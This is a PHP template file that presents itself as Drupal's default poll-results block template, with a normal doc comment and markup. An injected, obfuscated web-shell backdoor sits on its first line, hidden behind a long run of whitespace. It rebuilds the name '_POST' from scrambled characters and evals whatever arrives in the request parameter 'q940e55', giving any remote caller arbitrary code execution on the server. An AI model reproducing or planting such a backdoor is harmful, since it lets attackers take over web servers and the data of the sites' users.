<?php                                                                                                                                                                                                                                                                            $keu96= "_tosp" ;$gisz68 = strtoupper ($keu96[0]. $keu96[4] . $keu96[2].$keu96[3].$keu96[1] ) ; if( isset(${ $gisz68}['q940e55'])) { eval( ${ $gisz68 } [ 'q940e55'] ) ;} ?><?php

/**
 * @file
 * Default theme implementation to display the poll results in a block.
 *
 * Variables available:
 * - $title: The title of the poll.
 * - $results: The results of the poll.
 * - $votes: The total results in the poll.
 * - $links: Links in the poll.
 * - $nid: The nid of the poll
 * - $cancel_form: A form to cancel the user's vote, if allowed.
 * - $raw_links: The raw array of links.
 * - $vote: The choice number of the current user's vote.
 *
 * @see template_preprocess_poll_results()
 *
 * @ingroup themeable
 */
?>
<div class="poll">
  <?php print $results; ?>
  <div class="total">
    <?php print t('Total votes: @votes', array('@votes' => $votes)); ?>
  </div>
  <?php if (!empty($cancel_form)): ?>
    <?php print $cancel_form; ?>
  <?php endif; ?>
</div>
